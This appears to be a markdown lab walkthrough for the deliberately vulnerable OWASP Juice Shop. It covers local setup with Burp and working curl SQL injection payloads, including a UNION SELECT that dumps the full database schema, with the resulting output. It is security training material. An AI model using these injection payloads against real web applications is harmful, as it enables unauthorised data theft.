# Juice Shop

Resources

* [Official documentation](https://owasp.org/www-project-juice-shop)
* [Pwning OWASP Juice Shop](https://help.owasp-juice.shop)

Local setup

```bash
# starts vulnerable box
hckctl box start vulnerable/owasp-juice-shop

# starts attack box
hckctl box start parrot-sec

# default password: parrot
# vnc/noVNC copy&paste clipboard: CTRL+SHIFT+C/V
vncviewer localhost:5900

# install burp
burpsuite

# install add-on
# name: burpsuite
# address: localhost
# port: 8080
install_firefox_foxy_proxy
```

<!--

TODO
* box alias/hostname i.e. box-owasp-juice-shop-7159w:3000 -> juice:3000
* kali-ui
* parrot-web

-->

## Challenges

* [Challenge hunting](https://help.owasp-juice.shop/part2/)

### Finding the Score Board

Guess link is `http://box-owasp-juice-shop-<RANDOM>:3000/#/score-board`

### Injection

Resources
* [SQL injection](https://portswigger.net/web-security/sql-injection)

With burp look for a request with parameters
```bash
# sent to intruder
#GET /rest/products/search?q=';

# manually
curl -sS -H "Accept: application/json" "http://box-owasp-juice-shop-<RANDOM>:3000/rest/products/search?q=foo';" | jq
# output
{
  "error": {
    "message": "SQLITE_ERROR: near \";\": syntax error",
    "stack": "Error: SQLITE_ERROR: near \";\": syntax error",
    "errno": 1,
    "code": "SQLITE_ERROR",
    "sql": "SELECT * FROM Products WHERE ((name LIKE '%foo';%' OR description LIKE '%foo';%') AND deletedAt IS NULL) ORDER BY name"
  }
}
```

Order the Christmas special offer of 2014
```bash
curl -sS -H "Accept: application/json" "http://box-owasp-juice-shop-<RANDOM>:3000/rest/products/search?q=2014%'+AND+deletedAt+IS+NOT+NULL));--" | jq

# output
{
  "status": "success",
  "data": [
    {
      "id": 10,
      "name": "Christmas Super-Surprise-Box (2014 Edition)",
      "description": "Contains a random selection of 10 bottles (each 500ml) of our tastiest juices and an extra fan shirt for an unbeatable price! (Seasonal special offer! Limited availability!)",
      "price": 29.99,
      "deluxePrice": 29.99,
      "image": "undefined.jpg",
      "createdAt": "2023-10-25 20:11:27.317 +00:00",
      "updatedAt": "2023-10-25 20:11:27.317 +00:00",
      "deletedAt": "2023-10-25 20:11:27.479 +00:00"
    }
  ]
}

# with firefox or burp edit and send a POST request with ProductId=10
#http://box-owasp-juice-shop-0eruj:3000/api/BasketItems
#{"ProductId":10,"BasketId":"6","quantity":1}
```

Exfiltrate the entire DB schema definition via SQL Injection
```bash
# Products table has 9 columns (see json above)
# to fix "SQLITE_ERROR: SELECTs to the left and right of UNION do not have the same number of result columns"
# add N "foo" static columns in order to match them
curl -sS -H "Accept: application/json" "http://box-owasp-juice-shop-<RANDOM>:3000/rest/products/search?q=foo%'))+UNION+SELECT+name,+sql+,+'foo',+'foo',+'foo',+'foo',+'foo',+'foo',+'foo'+FROM+sqlite_master+WHERE+type='table';--" | jq '.data | map({"id":.id,"name":.name})'

# output
[
  {
    "id": "Addresses",
    "name": "CREATE TABLE `Addresses` (`UserId` INTEGER REFERENCES `Users` (`id`) ON DELETE NO ACTION ON UPDATE CASCADE, `id` INTEGER PRIMARY KEY AUTOINCREMENT, `fullName` VARCHAR(255), `mobileNum` INTEGER, `zipCode` VARCHAR(255), `streetAddress` VARCHAR(255), `city` VARCHAR(255), `state` VARCHAR(255), `country` VARCHAR(255), `createdAt` DATETIME NOT NULL, `updatedAt` DATETIME NOT NULL)"
  },
  {
    "id": "BasketItems",
    "name": "CREATE TABLE `BasketItems` (`ProductId` INTEGER REFERENCES `Products` (`id`) ON DELETE CASCADE ON UPDATE CASCADE, `BasketId` INTEGER REFERENCES `Baskets` (`id`) ON DELETE CASCADE ON UPDATE CASCADE, `id` INTEGER PRIMARY KEY AUTOINCREMENT, `quantity` INTEGER, `createdAt` DATETIME NOT NULL, `updatedAt` DATETIME NOT NULL, UNIQUE (`ProductId`, `BasketId`))"
  },
  {
    "id": "Baskets",
    "name": "CREATE TABLE `Baskets` (`id` INTEGER PRIMARY KEY AUTOINCREMENT, `coupon` VARCHAR(255), `UserId` INTEGER REFERENCES `Users` (`id`) ON DELETE NO ACTION ON UPDATE CASCADE, `createdAt` DATETIME NOT NULL, `updatedAt` DATETIME NOT NULL)"
  },
  {
    "id": "Captchas",
    "name": "CREATE TABLE `Captchas` (`id` INTEGER PRIMARY KEY AUTOINCREMENT, `captchaId` INTEGER, `captcha` VARCHAR(255), `answer` VARCHAR(255), `createdAt` DATETIME NOT NULL, `updatedAt` DATETIME NOT NULL)"
  },
  {
    "id": "Cards",
    "name": "CREATE TABLE `Cards` (`UserId` INTEGER REFERENCES `Users` (`id`) ON DELETE NO ACTION ON UPDATE CASCADE, `id` INTEGER PRIMARY KEY AUTOINCREMENT, `fullName` VARCHAR(255), `cardNum` INTEGER, `expMonth` INTEGER, `expYear` INTEGER, `createdAt` DATETIME NOT NULL, `updatedAt` DATETIME NOT NULL)"
  },
  {
    "id": "Challenges",
    "name": "CREATE TABLE `Challenges` (`id` INTEGER PRIMARY KEY AUTOINCREMENT, `key` VARCHAR(255), `name` VARCHAR(255), `category` VARCHAR(255), `tags` VARCHAR(255), `description` VARCHAR(255), `difficulty` INTEGER, `hint` VARCHAR(255), `hintUrl` VARCHAR(255), `mitigationUrl` VARCHAR(255), `solved` TINYINT(1), `disabledEnv` VARCHAR(255), `tutorialOrder` NUMBER, `codingChallengeStatus` NUMBER, `createdAt` DATETIME NOT NULL, `updatedAt` DATETIME NOT NULL)"
  },
  {
    "id": "Complaints",
    "name": "CREATE TABLE `Complaints` (`UserId` INTEGER REFERENCES `Users` (`id`) ON DELETE NO ACTION ON UPDATE CASCADE, `id` INTEGER PRIMARY KEY AUTOINCREMENT, `message` VARCHAR(255), `file` VARCHAR(255), `createdAt` DATETIME NOT NULL, `updatedAt` DATETIME NOT NULL)"
  },
  {
    "id": "Deliveries",
    "name": "CREATE TABLE `Deliveries` (`id` INTEGER PRIMARY KEY AUTOINCREMENT, `name` VARCHAR(255), `price` FLOAT, `deluxePrice` FLOAT, `eta` FLOAT, `icon` VARCHAR(255), `createdAt` DATETIME NOT NULL, `updatedAt` DATETIME NOT NULL)"
  },
  {
    "id": "Feedbacks",
    "name": "CREATE TABLE `Feedbacks` (`UserId` INTEGER REFERENCES `Users` (`id`) ON DELETE NO ACTION ON UPDATE CASCADE, `id` INTEGER PRIMARY KEY AUTOINCREMENT, `comment` VARCHAR(255), `rating` INTEGER NOT NULL, `createdAt` DATETIME NOT NULL, `updatedAt` DATETIME NOT NULL)"
  },
  {
    "id": "ImageCaptchas",
    "name": "CREATE TABLE `ImageCaptchas` (`id` INTEGER PRIMARY KEY AUTOINCREMENT, `image` VARCHAR(255), `answer` VARCHAR(255), `UserId` INTEGER REFERENCES `Users` (`id`) ON DELETE NO ACTION ON UPDATE CASCADE, `createdAt` DATETIME, `updatedAt` DATETIME NOT NULL)"
  },
  {
    "id": "Memories",
    "name": "CREATE TABLE `Memories` (`UserId` INTEGER REFERENCES `Users` (`id`) ON DELETE NO ACTION ON UPDATE CASCADE, `id` INTEGER PRIMARY KEY AUTOINCREMENT, `caption` VARCHAR(255), `imagePath` VARCHAR(255), `createdAt` DATETIME NOT NULL, `updatedAt` DATETIME NOT NULL)"
  },
  {
    "id": "PrivacyRequests",
    "name": "CREATE TABLE `PrivacyRequests` (`id` INTEGER PRIMARY KEY AUTOINCREMENT, `UserId` INTEGER REFERENCES `Users` (`id`) ON DELETE NO ACTION ON UPDATE CASCADE, `deletionRequested` TINYINT(1) DEFAULT 0, `createdAt` DATETIME NOT NULL, `updatedAt` DATETIME NOT NULL)"
  },
  {
    "id": "Products",
    "name": "CREATE TABLE `Products` (`id` INTEGER PRIMARY KEY AUTOINCREMENT, `name` VARCHAR(255), `description` VARCHAR(255), `price` DECIMAL, `deluxePrice` DECIMAL, `image` VARCHAR(255), `createdAt` DATETIME NOT NULL, `updatedAt` DATETIME NOT NULL, `deletedAt` DATETIME)"
  },
  {
    "id": "Quantities",
    "name": "CREATE TABLE `Quantities` (`ProductId` INTEGER REFERENCES `Products` (`id`) ON DELETE NO ACTION ON UPDATE CASCADE, `id` INTEGER PRIMARY KEY AUTOINCREMENT, `quantity` INTEGER, `limitPerUser` INTEGER DEFAULT NULL, `createdAt` DATETIME NOT NULL, `updatedAt` DATETIME NOT NULL)"
  },
  {
    "id": "Recycles",
    "name": "CREATE TABLE `Recycles` (`UserId` INTEGER REFERENCES `Users` (`id`) ON DELETE NO ACTION ON UPDATE CASCADE, `AddressId` INTEGER REFERENCES `Addresses` (`id`) ON DELETE NO ACTION ON UPDATE CASCADE, `id` INTEGER PRIMARY KEY AUTOINCREMENT, `quantity` INTEGER, `isPickup` TINYINT(1) DEFAULT 0, `date` DATETIME, `createdAt` DATETIME NOT NULL, `updatedAt` DATETIME NOT NULL)"
  },
  {
    "id": "SecurityAnswers",
    "name": "CREATE TABLE `SecurityAnswers` (`UserId` INTEGER UNIQUE REFERENCES `Users` (`id`) ON DELETE NO ACTION ON UPDATE CASCADE, `SecurityQuestionId` INTEGER REFERENCES `SecurityQuestions` (`id`) ON DELETE NO ACTION ON UPDATE CASCADE, `id` INTEGER PRIMARY KEY AUTOINCREMENT, `answer` VARCHAR(255), `createdAt` DATETIME NOT NULL, `updatedAt` DATETIME NOT NULL)"
  },
  {
    "id": "SecurityQuestions",
    "name": "CREATE TABLE `SecurityQuestions` (`id` INTEGER PRIMARY KEY AUTOINCREMENT, `question` VARCHAR(255), `createdAt` DATETIME NOT NULL, `updatedAt` DATETIME NOT NULL)"
  },
  {
    "id": "Users",
    "name": "CREATE TABLE `Users` (`id` INTEGER PRIMARY KEY AUTOINCREMENT, `username` VARCHAR(255) DEFAULT '', `email` VARCHAR(255) UNIQUE, `password` VARCHAR(255), `role` VARCHAR(255) DEFAULT 'customer', `deluxeToken` VARCHAR(255) DEFAULT '', `lastLoginIp` VARCHAR(255) DEFAULT '0.0.0.0', `profileImage` VARCHAR(255) DEFAULT '/assets/public/images/uploads/default.svg', `totpSecret` VARCHAR(255) DEFAULT '', `isActive` TINYINT(1) DEFAULT 1, `createdAt` DATETIME NOT NULL, `updatedAt` DATETIME NOT NULL, `deletedAt` DATETIME)"
  },
  {
    "id": "Wallets",
    "name": "CREATE TABLE `Wallets` (`UserId` INTEGER REFERENCES `Users` (`id`) ON DELETE NO ACTION ON UPDATE CASCADE, `id` INTEGER PRIMARY KEY AUTOINCREMENT, `balance` INTEGER DEFAULT 0, `createdAt` DATETIME NOT NULL, `updatedAt` DATETIME NOT NULL)"
  },
  {
    "id": "sqlite_sequence",
    "name": "CREATE TABLE sqlite_sequence(name,seq)"
  }
]
```

Log in with the (non-existing) accountant without ever registering that user
```bash
TODO
```
